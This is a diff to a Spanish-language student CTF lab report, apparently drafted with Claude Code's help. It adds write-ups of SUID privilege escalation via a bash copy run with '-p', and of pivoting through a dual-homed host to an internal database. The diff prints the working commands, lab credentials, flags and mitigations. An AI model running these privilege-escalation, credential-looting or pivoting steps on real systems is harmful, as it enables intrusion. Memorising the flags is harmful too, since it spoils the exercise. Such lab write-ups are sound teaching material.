@@ -9,6 +9,7 @@
 | Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
 |---|---|---|---|
 | Claude (Anthropic), vía Claude Code | Asistencia en la exploración del host víctima (`situational awareness`), análisis de notas de deploy y loot de credenciales de la Parte 1; borrador de la redacción de las secciones correspondientes de la tabla, evidencias 2.1 y 2.2, y respuesta P3. | `informe.md`: filas de Recon del host y Loot de la tabla, secciones 2.1 y 2.2, respuesta P3 y bitácora de la Parte 1. | Las salidas pegadas en la sección 2 corresponden a la terminal del host comprometido. Las flags capturadas se validaron contra el evaluador del laboratorio con `./ctf submit 08`. El grupo revisó técnicamente el contenido y comprende las implicancias operativas y defensivas del análisis. |
+| Claude (Anthropic), vía Claude Code | Asistencia en la Parte 2: enumeración de binarios SUID y explotación (GTFOBins) del R3, y pivoting a la red interna segmentada del R4; borrador de la redacción de esas secciones, evidencias y preguntas de análisis. | `informe.md`: filas de Privesc y Pivoting de la tabla, secciones 2.3 y 2.4, respuestas P1, P2 y P5, y bloque de la Parte 2 en la bitácora; ampliación de `scripts/recon_loot.sh` con los pasos de R3/R4. | Las salidas pegadas corresponden a la ejecución real del entorno (`./ctf lab 08`, `docker exec`). Las flags `FLAG{privesc_suid_root}` y `FLAG{pivot_internal_host}` se validaron contra el evaluador con `./ctf submit 08 R3/R4` (progreso 4/5). El grupo revisó técnicamente el contenido y comprende las implicancias operativas y defensivas. |
 
 El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.
 
@@ -23,11 +24,11 @@ El grupo declara que comprende el contenido íntegro de lo entregado y que puede
 
    ✓  R1     Reconocimiento del host comprometido
    ✓  R2     Loot de credenciales
-   ·  R3     Escalada de privilegios (SUID)
-   ·  R4     Pivoting al host interno
+   ✓  R3     Escalada de privilegios (SUID)
+   ✓  R4     Pivoting al host interno
    ·  R5     Automatizacion (fuerza bruta de legajos)
 
-  ████████████░░░░░░░░░░░░░░░░░░  2/5 (40%)
+  ████████████████████████░░░░░░  4/5 (80%)
 ```
 
 ---
@@ -38,8 +39,8 @@ El grupo declara que comprende el contenido íntegro de lo entregado y que puede
 |---|---|---|---|---|
 | Recon del host (R1) | Relevamiento de identidad y entorno (`situational awareness`), inspección del árbol de directorios administrativos en `/opt`. | `id`, `whoami`, `hostname`, `uname -a`, `env`, `ls -la /opt` y lectura con `cat /opt/phantom-deploy/DEPLOY_NOTES.txt`. | Usuario `operador` (uid=1000), hostname `phantomcorp`, entorno `DEPLOY_ENV=produccion`. Nota de despliegue con token activo: `FLAG{post_situational_awareness}`. | **Mínimo privilegio en filesystem y limpieza de artefactos**. No dejar notas de aprovisionamiento en hosts de producción; restringir permisos de lectura a directorios administrativos (`chmod 700 /opt/...`) accesibles únicamente por `root`. |
 | Loot de credenciales (R2) | Búsqueda de secretos estáticos de aplicación en archivos de configuración (`.env`) y lectura del historial de comandos del usuario (`~/.bash_history`). | `cat /var/www/.env` y `cat /home/operador/.bash_history`. | Archivo `.env` exponiendo base de datos interna (`DB_HOST=phantomcorp-db`, `DB_USER=phantom_app`, contraseña `Ph@ntom-DB-2024`) y `APP_SECRET=FLAG{loot_credentials_found}`. El historial confirmó acceso previo a `http://phantomcorp-db/`. | **Gestión centralizada de secretos**. No guardar credenciales en archivos planos en el filesystem. Usar un gestor de secretos (HashiCorp Vault, AWS Secrets Manager) que inyecte secretos efímeros en memoria en tiempo de ejecución. Restringir permisos (`chmod 600`) y deshabilitar o sanitizar `HISTFILE`. |
-| Privesc (SUID) (R3) | *(pendiente — parte del compañero que realice R3 en la Parte 2)* | | | |
-| Pivoting (R4) | *(pendiente — parte del compañero que realice R4 en la Parte 2)* | | | |
+| Privesc (SUID) (R3) | Enumeración de binarios con bit SUID y explotación de una copia SUID de `bash` (`system-check`) para obtener contexto de `root` y leer `/root/flag.txt`. | `find / -perm -4000 -type f 2>/dev/null` y `/usr/local/bin/system-check -p -c 'cat /root/flag.txt'` (técnica GTFOBins). | Binario no estándar `-rwsr-xr-x root root /usr/local/bin/system-check` (copia de bash). Con `-p` el shell mantiene `euid=0(root)` → lectura de `/root/flag.txt` = `FLAG{privesc_suid_root}`. | **Eliminar el SUID innecesario y endurecer el host**. Quitar el bit (`chmod u-s`), auditar periódicamente (`find / -perm -4000`), montar particiones con `nosuid`, y aplicar MAC (AppArmor/SELinux) para que ningún shell herede privilegios de root. |
+| Pivoting (R4) | Uso del host comprometido como trampolín hacia la red interna segmentada (`internalnet`) para alcanzar `phantomcorp-db`, invisible desde la consola del atacante. | `ip -br a` (dos interfaces), `curl -s http://phantomcorp-db/` desde la víctima. Contraste: el mismo `curl` desde el atacante falla. | La víctima tiene doble interfaz (`eth0 192.168.97.3` labnet, `eth1 192.168.117.3` internalnet). El atacante (solo labnet) no tiene ruta al db; desde la víctima la respuesta trae `FLAG{pivot_internal_host}`. | **Microsegmentación y mínimo privilegio de red**. No conectar hosts expuestos a redes internas sensibles; aplicar firewall por host/NSG con reglas de egreso explícitas, VLANs separadas y políticas *zero-trust* que no asuman confianza por estar dentro de la LAN. |
 
 ### 2.1 R1 — Reconocimiento del host comprometido
 
@@ -132,6 +133,83 @@ curl http://phantomcorp-db/
 
 El historial confirma que el host `phantomcorp-db` es alcanzable vía HTTP desde este equipo (`curl http://phantomcorp-db/`), sirviendo como pista directa para la fase de pivoting.
 
+### 2.3 R3 — Escalada de privilegios (SUID)
+
+Seguimos la tercera pregunta de la post-explotación: **¿Qué puedo hacer?**. El objetivo es pasar del usuario sin privilegios `operador` a `root`. La vía clásica es un binario con el **bit SUID** activo, que se ejecuta con los permisos de su *dueño* (root) en lugar de los de quien lo invoca.
+
+Enumeramos todos los binarios SUID del sistema:
+
+```
+$ id
+uid=1000(operador) gid=1000(operador) groups=1000(operador)
+
+$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/umount
+/usr/local/bin/system-check
+```
+
+Todos son binarios estándar del sistema **excepto uno**: `/usr/local/bin/system-check`. Lo inspeccionamos:
+
+```
+$ ls -la /usr/local/bin/system-check
+-rwsr-xr-x 1 root root 1412096 Oct 30 13:26 /usr/local/bin/system-check
+```
+
+La `s` en los permisos del dueño (`-rwsr-xr-x`) confirma el bit SUID, y el dueño es `root`. El tamaño (~1.4 MB) delata que es una **copia de `/bin/bash`**. La flag objetivo solo la puede leer root:
+
+```
+$ cat /root/flag.txt
+cat: /root/flag.txt: Permission denied
+```
+
+Según **GTFOBins**, un `bash` con SUID se explota invocándolo con el flag `-p`. Por defecto `bash` descarta el `euid` elevado por seguridad; `-p` (*privileged*) le indica que **conserve** el `euid` del dueño del binario (root). Así obtenemos ejecución como root:
+
+```
+$ /usr/local/bin/system-check -p -c 'id; cat /root/flag.txt'
+uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)
+FLAG{privesc_suid_root}
+```
+
+El `euid=0(root)` confirma la escalada. Con privilegios de root leemos el archivo restringido y obtenemos `FLAG{privesc_suid_root}`.
+
+### 2.4 R4 — Pivoting al host interno
+
+El `.env` (R2) y el `.bash_history` revelaron un host interno `phantomcorp-db`. Las redes internas están **segmentadas**: la consola del atacante vive en una red (`labnet`) que **no** tiene ruta hacia ese host. El servidor web comprometido, en cambio, está conectado a **ambas** redes y sirve de trampolín (*lateral movement*).
+
+Primero verificamos que desde la consola del atacante el host interno es inalcanzable:
+
+```
+$ curl -s --max-time 5 http://phantomcorp-db/
+[atacante] SIN RUTA al host interno
+```
+
+En la víctima inspeccionamos las interfaces de red, que explican el porqué:
+
+```
+$ ip -br a
+lo               UNKNOWN        127.0.0.1/8 ::1/128
+eth0@if26        UP             192.168.97.3/24
+eth1@if27        UP             192.168.117.3/24
+```
+
+La víctima tiene **dos interfaces**: `eth0` (`192.168.97.3`, red del atacante / `labnet`) y `eth1` (`192.168.117.3`, red interna segmentada / `internalnet`). El atacante solo ve la primera; el host interno vive solo en la segunda. Por eso la víctima es el puente obligatorio.
+
+Pivoteamos: desde la víctima alcanzamos el host interno vía HTTP:
+
+```
+$ curl -s http://phantomcorp-db/
+{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}
+```
+
+La respuesta del servicio interno entrega `FLAG{pivot_internal_host}` y confirma el acceso a la red segmentada. El endpoint `/empleado?id=N` que aparece en este host es el punto de partida de la automatización (R5).
+
 ---
 
 ## 3. Automatización
@@ -144,11 +222,15 @@ El historial confirma que el host `phantomcorp-db` es alcanzable vía HTTP desde
 
 **P1 — SUID y el flag `-p`.**
 
-*(pendiente — parte del compañero que realice R3 en la Parte 2)*
+Un binario **SUID** (*Set User ID*, bit `chmod u+s`) es peligroso porque se ejecuta siempre con los privilegios de su **dueño**, no con los de quien lo invoca. Cuando ese dueño es `root`, cualquier usuario sin privilegios que lo ejecute corre código con `euid=0`. Si el binario permite —directa o indirectamente— ejecutar comandos arbitrarios (un shell como `bash`, o utilidades como `find`, `vim`, `python`, `cp`, etc.), deja de ser una herramienta acotada y se convierte en una **ejecución de comandos como root**: eso es exactamente una escalada de privilegios. El catálogo GTFOBins documenta, binario por binario, cómo abusar de cada uno.
+
+El flag `-p` (*privileged*) de `bash` es la clave del caso concreto (CWE-250 / CWE-269). Por defecto, por seguridad, cuando `bash` detecta que su `euid` (usuario efectivo) difiere de su `uid` (usuario real) —justo lo que provoca el SUID— **descarta** el `euid` elevado y vuelve al usuario real, neutralizando el privilegio. El flag `-p` le indica que **no** baje privilegios y **conserve** el `euid` del dueño del binario. Por eso `system-check -p` mantiene `euid=0(root)` y permite leer `/root/flag.txt`, mientras que sin `-p` el shell correría como `operador` y el `cat` fallaría con *Permission denied*.
 
 **P2 — El pivoting (por qué el atacante no llegaba y vos sí).**
 
-*(pendiente — parte del compañero que realice R4 en la Parte 2)*
+El pivoting (*movimiento lateral*) fue posible por la **topología de red segmentada**. El entorno tiene dos redes: `labnet` (donde vive la consola del atacante) e `internalnet` (una red marcada como `internal`, sin salida ni ruta desde afuera). El host interno `phantomcorp-db` está conectado **únicamente** a `internalnet`.
+
+El atacante solo tiene interfaz en `labnet`, por lo que no existe ninguna ruta de red hacia `phantomcorp-db`: el `curl` desde la consola atacante falla por falta de ruta. El host comprometido `phantomcorp`, en cambio, es **dual-homed**: tiene una pata en `labnet` (`eth0 192.168.97.3`, por donde entró el atacante) y otra en `internalnet` (`eth1 192.168.117.3`, la misma red del db). Al tomar control de ese host, heredamos su conectividad a la red interna y lo usamos como **trampolín**: lanzamos las peticiones *desde* la víctima y así alcanzamos un host que desde Internet/`labnet` era literalmente inalcanzable. Ese es el patrón de muchas brechas reales: el equipo comprometido inicialmente es irrelevante; su valor está en la red interna que abre.
 
 **P3 — Cómo evitar secretos en `.env`/`.bash_history`.**
 
@@ -171,7 +253,13 @@ El hallazgo de secretos en texto claro dentro de `/var/www/.env` y en `~/.bash_h
 
 **P5 — Defensa para SUID y para pivoting.**
 
-*(pendiente — parte del compañero de la Parte 2)*
+**Mitigación del privesc por SUID.** La raíz del problema es un binario con privilegios innecesarios (CWE-250: *Execution with Unnecessary Privileges*).
+- **Inmediata:** quitar el bit SUID del binario ilegítimo (`chmod u-s /usr/local/bin/system-check`) y, directamente, no dejar copias de shells en el host. Ningún `bash`/`find`/`python` debería ser SUID-root.
+- **Preventiva:** auditar periódicamente los binarios SUID (`find / -perm -4000 -type f`) e integrarlo al pipeline/monitoreo (p. ej. AIDE/Tripwire para detectar cambios en permisos). Montar las particiones de datos y temporales con la opción `nosuid` para que el kernel ignore el bit. Aplicar control de acceso obligatorio (AppArmor/SELinux) que confine a los procesos aunque escalen. Y aplicar mínimo privilegio: si un servicio necesita una capacidad puntual, usar *Linux capabilities* acotadas (`setcap`) en vez de SUID-root completo.
+
+**Mitigación del pivoting.** La raíz es que un host expuesto tiene línea directa a una red interna sensible.
+- **Microsegmentación / zero-trust de red:** no conectar un host expuesto a Internet directamente a la red de bases de datos. Interponer firewall por host (nftables/iptables) o *Network Security Groups* con reglas de **egreso explícitas**: el servidor web solo debería poder hablar con el puerto/servicio estrictamente necesario del db, nada más. Separar en VLANs/subredes distintas y no asumir confianza por estar "dentro" de la LAN.
+- **Defensa en profundidad:** la base de datos debe exigir **autenticación fuerte** (no basta con alcanzarla por red), registrar y alertar sobre conexiones desde orígenes inesperados (el web no debería iterar 250 legajos), y aplicar *rate limiting* para frenar la enumeración automatizada del R5.
 
 ---
 
@@ -203,9 +291,28 @@ cat /var/www/.env                                   # DB_HOST, DB_USER, DB_PASS,
 cat /home/operador/.bash_history                    # curl http://phantomcorp-db/
 
 # ==============================================================================
+# PARTE 2 · Escalada de privilegios (R3) y Pivoting (R4)
+# ==============================================================================
+
+# 3. Escalada de privilegios por SUID (R3)
+id                                                  # uid=1000(operador) — sin privilegios
+find / -perm -4000 -type f 2>/dev/null              # binarios SUID -> /usr/local/bin/system-check (no estandar)
+ls -la /usr/local/bin/system-check                  # -rwsr-xr-x root root (copia de bash)
+cat /root/flag.txt                                  # Permission denied (aun como operador)
+/usr/local/bin/system-check -p -c 'id; cat /root/flag.txt'   # euid=0(root) -> FLAG{privesc_suid_root}
+
+# 4. Pivoting al host interno (R4)
+# (contraste) desde la consola del atacante NO hay ruta al host interno:
+#   make shell ; curl -s --max-time 5 http://phantomcorp-db/   -> SIN RUTA
+ip -br a                                             # eth0 192.168.97.3 (labnet) + eth1 192.168.117.3 (internalnet)
+curl -s http://phantomcorp-db/                      # pivot OK -> FLAG{pivot_internal_host}
+
+# ==============================================================================
 # Validación de flags capturadas desde la raíz del repositorio
 # ==============================================================================
 ./ctf submit 08 R1 'FLAG{post_situational_awareness}'
 ./ctf submit 08 R2 'FLAG{loot_credentials_found}'
-./ctf status 08                                     # Progreso: 2/5 (40%)
+./ctf submit 08 R3 'FLAG{privesc_suid_root}'
+./ctf submit 08 R4 'FLAG{pivot_internal_host}'
+./ctf status 08                                     # Progreso: 4/5 (80%)
 ```
